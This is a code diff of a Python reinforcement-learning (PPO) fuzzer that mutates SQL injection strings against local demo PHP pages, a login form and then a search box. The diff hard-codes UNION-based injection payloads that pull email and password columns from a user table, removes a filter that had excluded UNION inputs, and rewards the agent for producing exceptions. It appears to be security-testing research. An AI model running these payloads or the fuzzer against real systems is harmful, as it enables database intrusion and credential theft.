@@ -11,20 +11,16 @@ nltk.download('stopwords')
 nltk.download('wordnet')
 from nltk.tokenize import WordPunctTokenizer
 
-import numpy as np
-import tensorflow.keras.backend as K
-from tensorflow.keras.layers import Dense, Dropout, Conv2D, MaxPooling2D, Activation, Flatten, Input, Lambda
-from tensorflow.keras.layers import  RepeatVector, TimeDistributed, GlobalMaxPooling1D, Embedding, Permute
-from tensorflow.keras.optimizers import Adam
-import tensorflow as tf
-from tensorflow.keras import layers
-from tensorflow import keras
-from collections import deque
-import time
 import random
 from tqdm import tqdm
-import os
 from collections import Counter
+
+import numpy as np
+import tensorflow as tf
+from tensorflow import keras
+from tensorflow.keras import layers
+import scipy.signal
+import time
 
 pd.set_option('display.max_rows', 500)
 
@@ -36,14 +32,20 @@ from Stub.Stub import StubSession
 from grammar_lib.testCaseModifier import GCheckModifier
 from grammar_lib.SQLChecker import parser
 
-with open("grammar_lib/all_grammar_inputs.txt") as file:
-    all_grammar_inputs = [line.strip() for line in file]
+# with open("grammar_lib/all_grammar_inputs.txt") as file:
+#     all_grammar_inputs = [line.strip() for line in file]
 
+all_grammar_inputs = ["' ) UNION select NULL,email,pass,NULL from user;",
+                        "' ) UNION select NULL,email,pass,NULL from user;",
+                        "' null UNION select NULL,email,pass,NULL from user;",
+                        "' null UNION select NULL,email,pass,NULL from user;",
+                        "' ) UNION select NULL,email,pass,NULL from user",
+                        "' ) UNION select NULL,email,pass,NULL from user"]
+    
 all_grammar_inputs_mod = []
 for gram_inp in all_grammar_inputs:
-    if not any(txt_chk in gram_inp.lower() for txt_chk in ['union', 'order', 'admin', '/*']):
-        all_grammar_inputs_mod.append(gram_inp)
-        all_grammar_inputs_mod.append(gram_inp.replace('OR', 'AND'))
+    all_grammar_inputs_mod.append(gram_inp)
+    all_grammar_inputs_mod.append(gram_inp.replace("'", ')'))
 
 all_grammar_inputs = all_grammar_inputs_mod.copy()
 
@@ -55,12 +57,16 @@ sent = all_grammar_inputs.copy()
 
 sent_processed = []
 tokenizer = WordPunctTokenizer()
+max_len = 0
 
 for input_str in sent:
     input_str = str(input_str)
     input_str = input_str.lower()
     input_str = input_str.strip()
-    sent_processed.append(nltk.word_tokenize(input_str))
+    str_list = nltk.word_tokenize(input_str)
+    if len(str_list) > max_len:
+        max_len = len(str_list)
+    sent_processed.append(str_list)
     # sent_processed.append(tokenizer.tokenize(input_str))
     
 all_vocab = [v_w for v in sent_processed for v_w in v]
@@ -83,18 +89,42 @@ all_vocab = ['<EOS>']+all_vocab
 
 VOCAB_SIZE = len(all_vocab)
 
-VOCAB_SIZE
+VOCAB_SIZE, max_len
 
 
 # In[ ]:
 
 
-MAX_LENGTH = 11 # including EOS
+"""
+## Hyperparameters
+"""
+
+# Hyperparameters of the PPO algorithm
+MODEL_NAME = "RLFuzzPPOSearchRew_v1"
+steps_per_epoch = 50
+epochs = 5000
+gamma = 0.99
+clip_ratio = 0.2
+policy_learning_rate = 3e-4
+value_function_learning_rate = 1e-3
+train_policy_iterations = 80
+train_value_iterations = 80
+lam = 0.97
+target_kl = 0.01
+hidden_sizes = (64, 64)
+
+
+# In[ ]:
+
+
+MAX_LENGTH = 15 # including EOS
 
 loaded_test = [] # store compatible length grammar based init (generation) test strings
 for sent in sent_processed:
     if len(sent)<=MAX_LENGTH-1:
         loaded_test.append(sent)
+        
+len(loaded_test)
 
 
 # In[ ]:
@@ -152,6 +182,7 @@ class RLFuzz:
         self.seed_str = mutate_string_list(seed=self.seed_str, pos=pos, vocab=vocab)
 
 class RLFuzzEnv:
+    EXCEPTION_REWARD = 1
     MUTATION_PENALTY = 0.1
     SAME_STRING_PENALTY = 0.2 # eos & grammar related
     PARSER_PENALTY = 0.3
@@ -200,30 +231,37 @@ class RLFuzzEnv:
             if self.last_status == 1:
                 self.session.reset_session()
 
-            url="http://localhost/demo/example_mysql_injection_login.php"
-            jsonFilePath = './Stub/conditions.json'
+            url="http://localhost/demo/example_mysql_injection_search_box.php"
+            jsonFilePath = './Stub/conditions1.json'
             receive=self.session.s.get(url)
             form_details,keys=self.session.preprocessing_Form_Fields(url)
 
-            values=[username_rl, "RaNdOmStRiNg"]
+            values=[username_rl]
             logindata=self.session.form_input_feeding(keys,values,form_details)
             pass_Conditions, fail_Conditions = self.session.jsonReading(jsonFilePath)
             status = self.session.validation(url, logindata, keys, pass_Conditions, fail_Conditions)
             self.last_status = status
+            
+            status_ex = self.session.exceptionCatcher(url, logindata)
+            
+            exception_success = True if status_ex==1 else False
 
             fuzzing_success = True if status==1 else False
 
             if fuzzing_success:
-                print(f"\nSUCCESS_REWARD @ {self.episode_step}: ")
-                print(self.fuzzer)
-                print(f"OP: {self.operation}, pos: {action_pos}, vocab: {action_vocab}-{ind2word[action_vocab]}")
+#                 print(f"\nSUCCESS_REWARD @ {self.episode_step}: ")
+#                 print(self.fuzzer)
+#                 print(f"pos: {action_pos}, vocab: {action_vocab} -> {ind2word[action_vocab]}")
                 reward = self.SUCCESS_REWARD
+            elif exception_success:
+#                 print(f"EXCEPTION_REWARD @ {self.episode_step}: ", username_rl)
+                reward = self.EXCEPTION_REWARD
             else:
                 # print(f"MUTATION_PENALTY @ {self.episode_step}: ", username_rl)
                 reward = -self.MUTATION_PENALTY
 
         done = False
-        if self.episode_step >= 100 or (fuzzing_success and self.episode_step>25): #TODO: chk -- removed: @ SUCCESS_REWARD
+        if self.episode_step >= steps_per_epoch or (fuzzing_success and self.episode_step>steps_per_epoch//4): #TODO: chk -- removed: @ SUCCESS_REWARD
             done = True
 
         return np.array(new_observation), reward, done
@@ -239,18 +277,6 @@ class RLFuzzEnv:
 
 
 # In[ ]:
-
-
-import numpy as np
-import tensorflow as tf
-from tensorflow import keras
-from tensorflow.keras import layers
-import scipy.signal
-import time
-
-"""
-## Functions and class
-"""
 
 
 def discounted_cumulative_sums(x, discount):
@@ -388,26 +414,13 @@ def train_value_function(observation_buffer, return_buffer):
 
 
 """
-## Hyperparameters
-"""
-
-# Hyperparameters of the PPO algorithm
-steps_per_epoch = 50
-epochs = 5000
-gamma = 0.99
-clip_ratio = 0.2
-policy_learning_rate = 3e-4
-value_function_learning_rate = 1e-3
-train_policy_iterations = 80
-train_value_iterations = 80
-lam = 0.97
-target_kl = 0.01
-hidden_sizes = (64, 64)
-
-"""
 ## Initializations
 """
+random.seed(1)
+np.random.seed(1)
+tf.random.set_seed(1)
 
+agg_rewards = []
 # Initialize the environment and get the dimensionality of the
 # observation space and the number of possible actions
 env = RLFuzzEnv()
@@ -443,13 +456,36 @@ for epoch in tqdm(range(epochs), ascii=True, unit='episodes'):
     sum_return = 0
     sum_length = 0
     num_episodes = 0
+    
+    success_count = 0
 
     # Iterate over the steps of each epoch
     for t in range(steps_per_epoch):
         # Get the logits, action, and take one step in the environment
         observation = observation.reshape(1, -1)
         logits, action = sample_action(observation)
+        
+        obs_text_list = [ind2word[i] for i in observation[0]]
+        if ";" not in obs_text_list and obs_text_list.index("<EOS>")!=MAX_LENGTH-1 and random.random()<=0.9:
+            # print("--- semicolon ---@", t)
+            action = [env.squeeze_actions(action_pos = obs_text_list.index("<EOS>"), action_vocab = word2ind[";"])]
+            action = tf.constant(action, dtype=tf.int64)
+        
+        elif "'" in obs_text_list and ")" not in obs_text_list and random.random()<=0.9:
+            # print("--- ') ---@", t)
+            action = [env.squeeze_actions(action_pos = obs_text_list.index("'")+1, action_vocab = word2ind[")"])]
+            action = tf.constant(action, dtype=tf.int64)
+            
+        elif "'" not in obs_text_list and random.random()<=0.9:
+            # print("--- apos --- @", t)
+            action = [env.squeeze_actions(action_pos = 0, action_vocab = word2ind["'"])]
+            action = tf.constant(action, dtype=tf.int64)
+            
         observation_new, reward, done = env.step(action[0].numpy())
+        if reward > 0: success_count+=1
+#         print(" ".join(obs_text_list))
+#         print(" ".join(ind2word[i] for i in observation_new))
+#         print()
         episode_return += reward
         episode_length += 1
 
@@ -496,11 +532,27 @@ for epoch in tqdm(range(epochs), ascii=True, unit='episodes'):
         train_value_function(observation_buffer, return_buffer)
 
     # Print mean return and length for each epoch
+    agg_rewards.append(round((sum_return / num_episodes), 2))
     print(
-        f" Epoch: {epoch + 1}. Mean Return: {(sum_return / num_episodes):.2f}. Mean Length: {(sum_length / num_episodes):.2f}"
+        f" Epoch: {epoch + 1}. Mean Return: {(sum_return / num_episodes):.2f}. Mean Length: {(sum_length / num_episodes):.2f}. Success Count: {success_count}"
     )
     
     if epoch%100==0:
-        actor.save(f'models/ep_{epoch}__{(sum_return / num_episodes):.2f}__actor.h5')
-        critic.save(f'models/ep_{epoch}__{(sum_return / num_episodes):.2f}__critic.h5')
+        mean_agg = sum(agg_rewards[-100:])/len(agg_rewards[-100:])
+        print("Mean Aggregate: ", mean_agg)
+        actor.save(f'models/{MODEL_NAME}__ep_{epoch}__{(sum_return / num_episodes):.2f}__actor.h5')
+        critic.save(f'models/{MODEL_NAME}__ep_{epoch}__{(sum_return / num_episodes):.2f}__critic.h5')
+
+
+# In[ ]:
+
+
+actor.save(f'models/{MODEL_NAME}_FINAL__ep_{epoch}__{(sum_return / num_episodes):.2f}__actor.h5')
+critic.save(f'models/{MODEL_NAME}_FINAL__ep_{epoch}__{(sum_return / num_episodes):.2f}__critic.h5')
+
+
+# In[ ]:
+
+
+
 
